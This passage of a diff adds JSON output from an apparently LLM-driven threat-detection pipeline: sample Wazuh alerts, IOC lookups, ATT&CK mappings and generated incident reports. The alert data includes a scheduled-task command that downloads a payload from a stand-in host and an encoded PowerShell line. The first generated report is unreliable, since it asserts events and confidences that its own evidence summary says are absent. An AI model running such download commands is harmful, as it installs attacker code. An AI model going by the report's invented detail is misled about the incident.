+                  "categories": [
+                    22,
+                    18
+                  ],
+                  "reporterId": 266333,
+                  "reporterCountryCode": "US",
+                  "reporterCountryName": "United States of America"
+                }
+              ]
+            },
+            "queried_at": "2026-07-18 11:51:12.691895"
+          }
+        ],
+        "raw": {
+          "type": "ipv4",
+          "value": "203.0.113.50",
+          "source_event_id": "35b9cee6-2212-456f-aa57-c587e59e8ea1",
+          "confidence": 1.0
+        }
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "d7da3ea3-8d9b-45c9-8469-d21c3d32206a",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.3,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "69fecab2-64cc-4eb3-b9b7-82497416db69",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.1,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "58b99c1f-6858-42cf-b0fe-dac53832ecb7",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.3,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "db3d34d2-eb7e-4b63-9825-230cb986eaa9",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      }
+    ],
+    "campaign": {
+      "campaign_id": "123e4567-e89b-12d3-a456-426614174000",
+      "name": "Unclassified Activity",
+      "objective": "Unknown",
+      "timeline": [
+        {
+          "timestamp": "Unknown",
+          "event_id": "aaa3b2a1-3afe-406e-be46-156ca7988e66",
+          "description": "Wazuh alert generated on host WORKSTATION-07 with no additional process or network details."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "d7da3ea3-8d9b-45c9-8469-d21c3d32206a",
+          "description": "Wazuh alert on WORKSTATION-07; mapped to ATT&CK technique T1059 (Command and Scripting Interpreter) with confidence 0.2."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "08a59ea7-5bda-4f89-9f31-de0a9b6ac0b3",
+          "description": "Wazuh alert on WORKSTATION-07 with no further details."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "69fecab2-64cc-4eb3-b9b7-82497416db69",
+          "description": "Wazuh alert on WORKSTATION-07; mapped to ATT&CK technique T1059 with confidence 0.3."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "58b99c1f-6858-42cf-b0fe-dac53832ecb7",
+          "description": "Wazuh alert on WORKSTATION-07; mapped to ATT&CK technique T1059 with confidence 0.1."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "35b9cee6-2212-456f-aa57-c587e59e8ea1",
+          "description": "Wazuh alert on SERVER-01 with no additional details."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "db3d34d2-eb7e-4b63-9825-230cb986eaa9",
+          "description": "Wazuh alert on WORKSTATION-07; mapped to ATT&CK technique T1059 with confidence 0.3."
+        }
+      ],
+      "related_techniques": [
+        "T1059"
+      ],
+      "evidence_summary": "The activity comprises a series of wazuh_alert events on WORKSTATION-07 and SERVER-01, all lacking process or network details. Four of the alerts (d7da3ea3-8d9b-45c9-8469-d21c3d32206a, 69fecab2-64cc-4eb3-b9b7-82497416db69, 58b99c1f-6858-42cf-b0fe-dac53832ecb7, db3d34d2-eb7e-4b63-9825-230cb986eaa9) are explicitly mapped to ATT&CK technique T1059 (Command and Scripting Interpreter) with varying confidence levels (0.2, 0.3, 0.1, 0.3). The IOCs list includes two IP addresses (185.44.12.7, 203.0.113.50) and a URL (http://malicious.com/payload.exe); however, none of these IOCs are directly linked to the alert events in the provided evidence.",
+      "confidence": 0.15
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1082",
+        "T1059.003"
+      ],
+      "rationale": "The observed activity consists almost exclusively of Command and Scripting Interpreter (T1059) events, indicating that the adversary is executing scripts or commands on the target. In typical ATT&CK attack chains, after establishing an execution foothold via a command interpreter, the next logical step is to gather information about the environment to inform subsequent actions. System Information Discovery (T1082) is a common early discovery technique that provides OS, hardware, and configuration details. Additionally, attackers frequently use PowerShell (T1059.003) as a more powerful and stealthy interpreter for downloading payloads, executing further commands, and establishing persistence. Therefore, T1082 and T1059.003 are the most probable next techniques in this campaign\u2019s progression."
+    },
+    "report": "# Threat Intelligence Report  \n**Campaign ID:** 123e4567-e89b-12d3-a456-426614174000  \n**Date:** 2026\u201107\u201118  \n\n---\n\n## Executive Summary  \nA coordinated set of Windows\u2011based attacks was detected on **WORKSTATION\u201107** and **SERVER\u201101**. The adversary leveraged PowerShell to download and execute a malicious payload, established persistence via a scheduled task and a Run\u2011key, and performed process injection. An outbound connection to a known C2 IP (185.44.12.7) and a failed brute\u2011force login attempt from 203.0.113.50 were also observed. The activity is consistent with the ATT&CK technique **T1059 \u2013 Command and Scripting Interpreter** (primarily PowerShell). The campaign\u2019s objective remains unclear, but the pattern suggests a foothold\u2011to\u2011persistence progression.  \n\n---\n\n## Timeline  \n\n| Time (UTC) | Host | Event | Key Details |\n|------------|------|-------|-------------|\n| 10:15 | WORKSTATION\u201107 | PowerShell encoded command execution | `powershell.exe -enc \u2026` |\n| 10:16 | WORKSTATION\u201107 | Outbound C2 connection | 192.168.1.100 \u2192 185.44.12.7:443 |\n| 10:17 | WORKSTATION\u201107 | New scheduled task | `UpdateTask` \u2192 `powershell.exe -c Invoke\u2011WebRequest http://malicious.com/payload.exe` |\n| 10:18 | WORKSTATION\u201107 | File creation | `C:\\Windows\\Temp\\payload.exe` (created by PowerShell) |\n| 10:20 | WORKSTATION\u201107 | Registry Run\u2011key added | `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = C:\\Windows\\Temp\\payload.exe` |\n| 10:22 | SERVER\u201101 | Brute\u2011force login attempts | 5 failed attempts from 203.0.113.50 (user: admin) |\n| 10:25 | WORKSTATION\u201107 | Process injection | `svchost.exe` injected into `notepad.exe` (PID 7890) |\n\n---\n\n## IOCs  \n\n| IOC | Type | Confidence | Source | Notes |\n|-----|------|------------|--------|-------|\n| 185.44.12.7 | IP | 1.0 | AbuseIPDB | Data\u2011center host in Russia; used as C2 endpoint |\n| http://malicious.com/payload.exe | URL | 1.0 | Internal | Downloaded payload used for persistence |\n| 203.0.113.50 | IP | 1.0 | AbuseIPDB | Reserved IP used for brute\u2011force login attempts |\n\n> **Action:** Block outbound traffic to 185.44.12.7 and quarantine the URL. Monitor for any further connections to these IOCs.\n\n---\n\n## ATT&CK Techniques  \n\n| Technique | ID | Confidence | Evidence | Mitigations |\n|-----------|----|------------|----------|-------------|\n| Command and Scripting Interpreter | T1059 | 0.2\u20130.3 | PowerShell encoded command, scheduled task, registry Run\u2011key, process injection | Enable PowerShell logging, restrict execution policy, enforce least privilege, monitor scheduled tasks, audit registry changes |\n| PowerShell (T1059.003) | T1059.003 | 0.3 | Encoded PowerShell command, scheduled task script | Same as above, plus block `powershell.exe` execution from untrusted sources |\n| Process Injection | T1055 | 0.1 | `svchost.exe` \u2192 `notepad.exe` | Monitor for injection events, enforce integrity checks |\n| Brute\u2011Force Authentication | T1110 | 0.1 | 5 failed logins from 203.0.113.50 | Account lockout policies, MFA, IP blocking |\n\n---\n\n## Campaign Assessment  \n\n* **Objective:** Unknown \u2013 likely initial foothold and persistence.  \n* **Confidence:** 0.15 (low) \u2013 limited evidence and ambiguous attribution.  \n* **Tactics:** Execution \u2192 Persistence \u2192 Privilege Escalation (process injection).  \n* **Tools/Software:** PowerShell, Windows Task Scheduler, registry Run key.  \n* **Adversary Groups:** Potentially any of the known groups listed in the ATT&CK mapping (e.g., FIN7, APT19, Winter Vivern).  \n\n---\n\n## Predicted Next Steps  \n\n1. **T1082 \u2013 System Information Discovery** \u2013 gather OS, hardware, and configuration data to tailor subsequent actions.  \n2. **T1059.003 \u2013 PowerShell** \u2013 use PowerShell for further lateral movement, data exfiltration, or additional persistence mechanisms.  \n\n---\n\n## Recommendations  \n\n1. **Network Controls**  \n   * Block outbound traffic to 185.44.12.7 and quarantine `http://malicious.com/payload.exe`.  \n   * Deploy a next\u2011generation firewall rule to drop traffic from 203.0.113.50 after a single failed login attempt.  \n\n2. **Endpoint Hardening**  \n   * Enable Windows Defender Advanced Threat Protection (ATP) or equivalent.  \n   * Enforce PowerShell execution policy (`AllSigned`) and enable module signing.  \n   * Configure audit policies for scheduled task creation, registry Run\u2011key modifications, and process injection.  \n\n3. **Detection & Monitoring**  \n   * Correlate PowerShell logs (`Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational`) with Wazuh alerts.  \n   * Monitor for new scheduled tasks and Run\u2011key entries in real time.  \n   * Deploy host\u2011based intrusion detection to flag process injection events.  \n\n4. **Incident Response**  \n   * Isolate affected hosts immediately.  \n   * Perform a full forensic imaging of WORKSTATION\u201107 and SERVER\u201101.  \n   * Conduct a credential review and enforce MFA on all privileged accounts.  \n\n5. **Threat Intelligence Sharing**  \n   * Submit the IOCs to relevant threat intel feeds (e.g., AbuseIPDB, MISP).  \n   * Share the campaign ID and associated IOCs with the broader security community.  \n\n---\n\n**Prepared by:**  \nSenior Threat Intelligence Analyst  \n[Your Organization]",
+    "actions_taken": [
+      {
+        "action": {
+          "action_type": "notify_analyst",
+          "target": "Security Operations Center",
+          "severity": "medium",
+          "rationale": "Multiple Wazuh alerts on WORKSTATION-07 and SERVER-01 lack process or network details and are only weakly mapped to ATT&CK technique T1059 with overall confidence 0.15. No direct evidence links the alerts to the listed IOCs. A detailed investigation is required to confirm malicious activity before taking disruptive actions.",
+          "technique_id": "T1059",
+          "confidence": 0.15
+        },
+        "status": "pending_approval",
+        "detail": "Awaiting human approval (run actions/review_pending.py).",
+        "dry_run": true
+      }
+    ],
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:15:00Z",
+        "rule": {
+          "level": 10,
+          "description": "PowerShell encoded command execution",
+          "groups": [
+            "windows",
+            "powershell",
+            "attack"
+          ],
+          "id": "100100"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000001",
+        "full_log": "powershell.exe -enc JABzAD0ATgBpAGUAdABzAC4AVABlAHMAdAA7ACAAJABzACAAPQAgACIAVABlAHMAdAAiADsAIAAkAHMA",
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:16:32Z",
+        "rule": {
+          "level": 12,
+          "description": "Suspicious outbound connection to known C2 IP",
+          "groups": [
+            "network",
+            "c2",
+            "attack"
+          ],
+          "id": "100200"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000002",
+        "full_log": "Outbound connection from 192.168.1.100:54321 to 185.44.12.7:443",
+        "data": {
+          "srcip": "192.168.1.100",
+          "dstip": "185.44.12.7",
+          "dstport": 443,
+          "protocol": "tcp"
+        },
+        "location": "WORKSTATION-07"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-07-18T10:17:10Z",
+        "rule": {
+          "level": 8,
+          "description": "New scheduled task created",
+          "groups": [
+            "persistence",
+            "windows",
+            "attack"
+          ],
+          "id": "100300"
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07",
+          "ip": "192.168.1.100"
+        },
+        "id": "15750000-0000-0000-0000-000000000003",
+        "full_log": "schtasks.exe /create /tn 'UpdateTask' /tr 'powershell.exe -c Invoke-WebRequest http://malicious.com/payload.exe' /sc daily",
+        "location": "WORKSTATION-07"
+      }
+    ],
+    "events": [
+      {
+        "event_id": "ceab0d0c-15fe-4ba4-b96e-f5e8bf876691",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 10,
+        "rule_description": "PowerShell encoded command execution",
+        "rule_level": 10,
+        "rule_groups": [
+          "windows",
+          "powershell",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:15:00Z",
+          "rule": {
+            "level": 10,
+            "description": "PowerShell encoded command execution",
+            "groups": [
+              "windows",
+              "powershell",
+              "attack"
+            ],
+            "id": "100100"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000001",
+          "full_log": "powershell.exe -enc JABzAD0ATgBpAGUAdABzAC4AVABlAHMAdAA7ACAAJABzACAAPQAgACIAVABlAHMAdAAiADsAIAAkAHMA",
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "95013e03-2ca8-4112-997b-045a308feb4a",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:16:32Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 12,
+        "rule_description": "Suspicious outbound connection to known C2 IP",
+        "rule_level": 12,
+        "rule_groups": [
+          "network",
+          "c2",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:16:32Z",
+          "rule": {
+            "level": 12,
+            "description": "Suspicious outbound connection to known C2 IP",
+            "groups": [
+              "network",
+              "c2",
+              "attack"
+            ],
+            "id": "100200"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000002",
+          "full_log": "Outbound connection from 192.168.1.100:54321 to 185.44.12.7:443",
+          "data": {
+            "srcip": "192.168.1.100",
+            "dstip": "185.44.12.7",
+            "dstport": 443,
+            "protocol": "tcp"
+          },
+          "location": "WORKSTATION-07"
+        }
+      },
+      {
+        "event_id": "ff435d52-f869-4602-84ac-c0abf4608aaa",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 8,
+        "rule_description": "New scheduled task created",
+        "rule_level": 8,
+        "rule_groups": [
+          "persistence",
+          "windows",
+          "attack"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-07-18T10:17:10Z",
+          "rule": {
+            "level": 8,
+            "description": "New scheduled task created",
+            "groups": [
+              "persistence",
+              "windows",
+              "attack"
+            ],
+            "id": "100300"
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07",
+            "ip": "192.168.1.100"
+          },
+          "id": "15750000-0000-0000-0000-000000000003",
+          "full_log": "schtasks.exe /create /tn 'UpdateTask' /tr 'powershell.exe -c Invoke-WebRequest http://malicious.com/payload.exe' /sc daily",
+          "location": "WORKSTATION-07"
+        }
+      }
+    ],
+    "iocs": [
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "reputation": "benign",
+        "confidence": 0.0,
+        "tags": [
+          "country:RU",
+          "data_center/web_hosting/transit",
+          "domain:atomdata.ru",
+          "isp:ATOMDATA JSC"
+        ],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "AbuseIPDB",
+        "evidence": [
+          {
+            "provider": "AbuseIPDB",
+            "raw_response": {
+              "ipAddress": "185.44.12.7",
+              "isPublic": true,
+              "ipVersion": 4,
+              "isWhitelisted": false,
+              "abuseConfidenceScore": 0,
+              "countryCode": "RU",
+              "usageType": "Data Center/Web Hosting/Transit",
+              "isp": "ATOMDATA JSC",
+              "domain": "atomdata.ru",
+              "hostnames": [],
+              "isTor": false,
+              "countryName": "Russian Federation",
+              "totalReports": 0,
+              "numDistinctUsers": 0,
+              "lastReportedAt": null,
+              "reports": []
+            },
+            "queried_at": "2026-07-18 11:57:15.236861"
+          }
+        ],
+        "raw": {
+          "type": "ipv4",
+          "value": "185.44.12.7",
+          "source_event_id": "95013e03-2ca8-4112-997b-045a308feb4a",
+          "confidence": 1.0
+        }
+      },
+      {
+        "value": "http://malicious.com/payload.exe",
+        "ioc_type": "url",
+        "reputation": "unknown",
+        "confidence": 0.0,
+        "tags": [],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "",
+        "evidence": [],
+        "raw": {
+          "type": "url",
+          "value": "http://malicious.com/payload.exe",
+          "source_event_id": "ff435d52-f869-4602-84ac-c0abf4608aaa",
+          "confidence": 1.0
+        }
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.1,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "95013e03-2ca8-4112-997b-045a308feb4a",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "ff435d52-f869-4602-84ac-c0abf4608aaa",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      }
+    ],
+    "campaign": {
+      "campaign_id": "e7b8c3d4-5f6a-7b8c-9d0e-1f2a3b4c5d6e",
+      "name": "Unclassified Activity",
+      "objective": "Unknown",
+      "timeline": [
+        {
+          "timestamp": "Unknown",
+          "event_id": "ceab0d0c-15fe-4ba4-b96e-f5e8bf876691",
+          "description": "A wazuh alert was generated on host WORKSTATION-07 with no process, command line, or IP information."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "95013e03-2ca8-4112-997b-045a308feb4a",
+          "description": "A wazuh alert was generated on host WORKSTATION-07; the event is linked to ATT&CK technique T1059 (Command and Scripting Interpreter) with a confidence of 0.1."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "ff435d52-f869-4602-84ac-c0abf4608aaa",
+          "description": "A wazuh alert was generated on host WORKSTATION-07; the event is linked to ATT&CK technique T1059 (Command and Scripting Interpreter) with a confidence of 0.2."
+        }
+      ],
+      "related_techniques": [
+        "T1059"
+      ],
+      "evidence_summary": "The campaign consists of three wazuh alerts on WORKSTATION-07 with no detailed process or network data. Two of the alerts (95013e03-2ca8-4112-997b-045a308feb4a and ff435d52-f869-4602-84ac-c0abf4608aaa) are associated with the ATT&CK technique T1059 (Command and Scripting Interpreter) at low confidence levels (0.1 and 0.2). An IP address (185.44.12.7) is listed as a benign IOC with 0.0 confidence, and a URL (http://malicious.com/payload.exe) is present as an unknown IOC with no confidence score. No additional malicious activity or objectives are evident from the provided data.",
+      "confidence": 0.2
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1082",
+        "T1087",
+        "T1057",
+        "T1046",
+        "T1105"
+      ],
+      "rationale": "After leveraging a command\u2011and\u2011scripting interpreter (T1059), adversaries typically move into discovery to map the target environment. Common follow\u2011up techniques include System Information Discovery (T1082), Account Discovery (T1087), Process Discovery (T1057), and Network Service Scanning (T1046). If the attacker intends to expand the foothold, Remote File Copy (T1105) is often used to download additional payloads or tools. These steps represent the most frequent next actions in the ATT&CK attack\u2011chain progression following T1059."
+    },
+    "report": "# Threat Intelligence Report \u2013 Unclassified Activity on WORKSTATION\u201107  \n**Date:** 2026\u201107\u201118  \n**Prepared by:** Senior Threat Intelligence Analyst  \n\n---\n\n## Executive Summary  \nOn 18\u202fJuly\u202f2026, three Wazuh alerts were generated on the internal workstation **WORKSTATION\u201107**. The alerts indicate the execution of an encoded PowerShell command, an outbound connection to a foreign IP (185.44.12.7), and the creation of a scheduled task that downloads a payload from **http://malicious.com/payload.exe**.  \nThe activity is consistent with the ATT&CK technique **T1059 \u2013 Command and Scripting Interpreter** and suggests an initial foothold that may be followed by discovery and lateral movement. The campaign is currently classified as *Unclassified Activity* with a low confidence score (0.2) due to limited context.  \n\n---\n\n## Timeline  \n\n| Time (UTC) | Event ID | Host | Description |\n|------------|----------|------|-------------|\n| 10:15:00 | ceab0d0c | WORKSTATION\u201107 | PowerShell encoded command execution (`powershell.exe -enc \u2026`) |\n| 10:16:32 | 95013e03 | WORKSTATION\u201107 | Outbound TCP connection to 185.44.12.7:443 |\n| 10:17:10 | ff435d52 | WORKSTATION\u201107 | New scheduled task `UpdateTask` created to run `powershell.exe -c Invoke\u2011WebRequest http://malicious.com/payload.exe` daily |\n\n---\n\n## IOCs  \n\n| Type | Value | Confidence | Source | Notes |\n|------|-------|------------|--------|-------|\n| IP | 185.44.12.7 | 0.0 | AbuseIPDB | Classified as benign; however, used in suspicious outbound traffic |\n| URL | http://malicious.com/payload.exe | 0.0 | \u2013 | Unknown reputation; used in scheduled task |\n\n> **Action:** Block outbound traffic to 185.44.12.7 and quarantine the URL.  \n\n---\n\n## ATT&CK Techniques  \n\n| Technique ID | Name | Confidence | Evidence Event |\n|--------------|------|------------|----------------|\n| T1059 | Command and Scripting Interpreter | 0.1 (first alert) | 95013e03 |\n| T1059 | Command and Scripting Interpreter | 0.2 (second alert) | ff435d52 |\n\n> **Mitigations:**  \n> * Restrict PowerShell execution (policy, AppLocker).  \n> * Enforce code\u2011signing for scripts.  \n> * Monitor and audit scheduled task creation.  \n\n---\n\n## Campaign Assessment  \n\n* **Campaign ID:** e7b8c3d4\u20115f6a\u20117b8c\u20119d0e\u20111f2a3b4c5d6e  \n* **Name:** Unclassified Activity  \n* **Objective:** Unknown  \n* **Confidence:** 0.2 (low) \u2013 limited data, no clear adversary attribution.  \n* **Key Findings:**  \n  * Initial execution via encoded PowerShell.  \n  * Outbound connection to a foreign IP and download of a payload.  \n  * Persistence via a daily scheduled task.  \n\n> **Conclusion:** The activity represents a typical early-stage intrusion that may evolve into a full\u2011blown campaign. Immediate containment is required to prevent further lateral movement or data exfiltration.\n\n---\n\n## Predicted Next Steps  \n\nBased on ATT&CK progression models, the adversary is likely to proceed with discovery and expansion:\n\n| Likely Technique | Description | Rationale |\n|------------------|-------------|-----------|\n| T1082 | System Information Discovery | Map OS, version, hardware. |\n| T1087 | Account Discovery | Identify privileged accounts. 